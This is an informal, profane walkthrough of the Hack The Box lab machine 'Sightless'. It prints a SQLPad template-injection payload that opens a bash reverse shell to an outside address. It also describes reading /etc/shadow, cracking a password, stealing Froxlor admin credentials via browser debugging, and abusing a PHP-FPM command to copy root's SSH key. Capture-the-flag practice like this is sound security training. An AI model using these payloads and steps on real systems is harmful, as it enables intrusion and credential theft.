+++
title = "HTB - Sightless"
date = 2024-10-09
+++

### Scan
```
└─$ nmap -sV -sC -p- --open 10.10.11.32
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 14:50 EDT
Nmap scan report for 10.10.11.32
Host is up (0.12s latency).
Not shown: 56430 closed tcp ports (conn-refused), 9102 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=10/9%Time=6706D0C3%P=aarch64-unknown-linux-g
SF:nu%r(GenericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20F
SF:TP\x20Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20comman
SF:d:\x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x2
SF:0try\x20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.18 seconds
```

### Enum
lmao ftp prolly no go and ssh late stage
etx host
gobuster and wfuzz come up empy, but browsing sight we find sqlpad.sightless.htb. add to etc hosts
we find its version 6.10.0. Theres a vuln! https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb
follow the procedure to make connection with payload
`{{ process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.14.11/9001 0>&1"') }}`
Once we click test, we've got root. weird asf no access. we've got root as svc?
cat /etc/shadow for hashes
take and crack michael hash with john
`insaneclownposse`. now ssh in

USER:c73af69fadc2c24d1687ad3ac5154fd5

when we `netstat -tnlp`, we see port 8080 servicing, where it didnt in our scans
port forward ssh with `ssh -v -N -L 8080:localhost:8080 michael@sightless.htb`
visit `http://127.0.0.1:8080`, were met with a froxlor login
install brave >:( and go to `brave://inspect/#devices` . run netstat again and forward every port => 3 digits.
3306, 8080, 44905, 44603, 33060, 3000, 37761. create instances for all of these in brave until the froxlor appears
then, inspect, go to network tab, and probe index php and wait for the login. it'll be under payload. what the fuck
<img alt="Image" async src="images/Screenshot 2024-10-09 at 4.45.19 PM (2).png" width="800px"></img>
`ForlorfroxAdmin`
we're in <img alt="Image" async src="images/Screenshot 2024-10-09 at 4.47.43 PM.png" width="800px"></img>
We can see a php configuration that allows command injection. lets copy rt flag to tmp dir. you could also copy root rsa to tmp dir and ssh in that way. ill do the latter.
create new php version under fpm versions.
put this command in `cp /root/.ssh/id_rsa /tmp/id_rsa`
then, go to system setting, php fpm, and stop and restart the service. saving each time.

```
cp /root/root.txt /tmp/root.txt
```
check to see if there, then update perms same way
`chmod 644 /tmp/root.txt`
fuck this box omm
ROOT:859ac83ce4810139ed542f1d23aee710

